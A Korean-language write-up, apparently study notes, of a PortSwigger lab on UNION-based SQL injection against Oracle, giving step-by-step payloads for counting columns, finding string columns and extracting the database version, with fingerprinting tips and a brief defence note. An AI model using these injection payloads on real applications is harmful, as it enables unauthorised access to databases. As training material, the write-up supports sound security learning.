# Lab: SQL injection attack, querying the database type and version on Oracle

## 개요

- **난이도**: Apprentice
- **주제**: SQL Injection — UNION Attack / Database Fingerprinting
- **링크**: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## 목표

UNION 기반 SQL injection으로 Oracle DB의 버전 정보를 화면에 출력한다.

## 분석

이전 랩(001, 002)은 WHERE 절 조건을 무력화하는 것이 목적이었다면, 이 랩부터는 **UNION을 이용해 원하는 데이터를 직접 추출**하는 단계로 넘어간다.

UNION 공격이 성공하려면 두 가지 제약조건을 먼저 해결해야 한다.

1. **컬럼 수 일치** — UNION으로 결합하는 두 SELECT의 컬럼 수가 같아야 한다.
2. **데이터 타입 호환** — 각 컬럼의 데이터 타입이 호환되어야 한다.

## 풀이

### 1단계 — 컬럼 수 파악 (ORDER BY)

`ORDER BY`에 컬럼 번호를 지정하면, 범위를 초과할 때 에러가 발생한다. 이를 이용해 컬럼 수를 이진 탐색으로 좁혀나간다.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← 에러 발생
```

`ORDER BY 3`에서 에러가 발생했다면 원본 쿼리의 컬럼 수는 **2개**다.

> `ORDER BY`는 실제로 데이터를 추출하지 않으면서 컬럼 수만 탐색할 수 있어, UNION 공격의 사전 단계로 유용하다.

### 2단계 — 컬럼 수 확인 (UNION SELECT NULL)

`ORDER BY`로 추측한 컬럼 수를 UNION SELECT로 검증한다. NULL은 모든 데이터 타입과 호환되므로 타입 불일치 에러를 피할 수 있다.

```sql
' UNION SELECT NULL,NULL FROM DUAL--
```

응답이 정상적으로 반환되면 컬럼 수가 맞다.

> **Oracle 주의사항**: Oracle에서는 `SELECT`에 반드시 `FROM` 절이 있어야 한다. 다른 DBMS(`FROM` 생략 가능)와 달리 Oracle은 더미 테이블 `DUAL`을 사용한다.

| DBMS | NULL 확인 페이로드 |
|------|-------------------|
| Oracle | `' UNION SELECT NULL,NULL FROM DUAL--` |
| MySQL / PostgreSQL / MSSQL | `' UNION SELECT NULL,NULL--` |

### 3단계 — 문자열 출력 가능한 컬럼 확인

NULL 대신 문자열 리터럴을 넣어 어느 컬럼이 문자열을 출력할 수 있는지 확인한다.

```sql
' UNION SELECT 'a',NULL FROM DUAL--
' UNION SELECT NULL,'a' FROM DUAL--
```

화면에 `'a'`가 표시되는 컬럼이 문자열 출력 가능한 컬럼이다.

### 4단계 — Oracle 버전 추출

Oracle의 버전 정보는 `v$version` 뷰의 `BANNER` 컬럼에 저장되어 있다.

```sql
' UNION SELECT BANNER,NULL FROM v$version--
```

응답 예시:

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

## 핵심 정리

- UNION 공격 전에 **컬럼 수**와 **문자열 출력 가능 컬럼**을 반드시 파악해야 한다.
- `ORDER BY N`으로 컬럼 수를 탐색하고, `UNION SELECT NULL...`로 검증한다.
- Oracle은 `FROM DUAL`이 필수이며, 이를 빠뜨리면 문법 에러가 발생한다.
- **방어**: Prepared Statement 사용, DB 계정에 최소 권한만 부여 (`v$version` 같은 시스템 뷰 접근 차단).

## 배운 점 및 추가 학습

### 1. 컬럼 수 탐색 — ORDER BY vs UNION SELECT NULL 비교

두 방법 모두 컬럼 수를 파악하는 데 사용되지만 접근 방식이 다르다.

| 방법 | 원리 | 장점 |
|------|------|------|
| `ORDER BY N` | N이 컬럼 수를 초과하면 에러 | 에러 유무만으로 빠르게 탐색 가능 |
| `UNION SELECT NULL,...` | 컬럼 수 불일치 시 에러 | 컬럼 수와 타입을 동시에 검증 |

실전에서는 `ORDER BY`로 컬럼 수를 먼저 좁힌 뒤, `UNION SELECT NULL`로 확정하는 순서로 진행한다.

### 2. Oracle의 DUAL 테이블

`DUAL`은 Oracle이 제공하는 단일 행, 단일 열의 더미 테이블이다.

```sql
SELECT 'hello' FROM DUAL;   -- 결과: hello
SELECT SYSDATE FROM DUAL;   -- 결과: 현재 날짜
```

- Oracle은 `FROM` 절 없는 SELECT를 허용하지 않으므로, 테이블 조회 없이 값만 반환할 때 `DUAL`을 사용한다.
- UNION 공격 페이로드 작성 시 Oracle 여부를 먼저 파악해야 `FROM DUAL` 누락 실수를 방지할 수 있다.

### 3. DBMS별 버전 확인 쿼리

DBMS를 식별하고 버전을 추출하는 쿼리는 DBMS마다 다르다. [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)를 참고.

| DBMS | 버전 쿼리 | 참고 |
|------|-----------|------|
| Oracle | `SELECT BANNER FROM v$version` | `v$version` 뷰, BANNER 컬럼 |
| MySQL | `SELECT @@version` | 시스템 변수 |
| PostgreSQL | `SELECT version()` | 함수 호출 |
| MSSQL | `SELECT @@version` | 시스템 변수 |

### 4. DBMS 핑거프린팅 — 어떻게 Oracle임을 알 수 있나?

실제 환경에서는 대상 DBMS를 모른 채 시작한다. 다음 방법으로 식별할 수 있다.

- **에러 메시지**: 에러가 노출되면 DBMS 이름이 포함되는 경우가 많다.
- **문법 차이 이용**: `FROM DUAL`을 붙였을 때만 응답이 정상이면 Oracle일 가능성이 높다.
- **버전 함수 시도**: `@@version`, `version()`, `BANNER` 등을 차례로 시도해 응답을 비교한다.
- **주석 구문 차이**: `--`, `#`, `/**/` 등의 반응으로 DBMS를 좁힐 수 있다.

### 5. 추가로 고민해볼 것

- `v$version`은 Oracle DBA 또는 SELECT ANY DICTIONARY 권한이 있어야 조회 가능하다. 권한이 없을 경우 다른 시스템 뷰를 탐색해야 한다.
- 컬럼이 3개 이상일 때 문자열 출력 가능한 컬럼을 빠르게 찾으려면 `'a'`를 한 칸씩 이동하며 시도하는 것이 기본이다.
- UNION 결과가 화면에 표시되지 않는 경우(Blind SQLi)에는 전혀 다른 추출 기법이 필요하다.
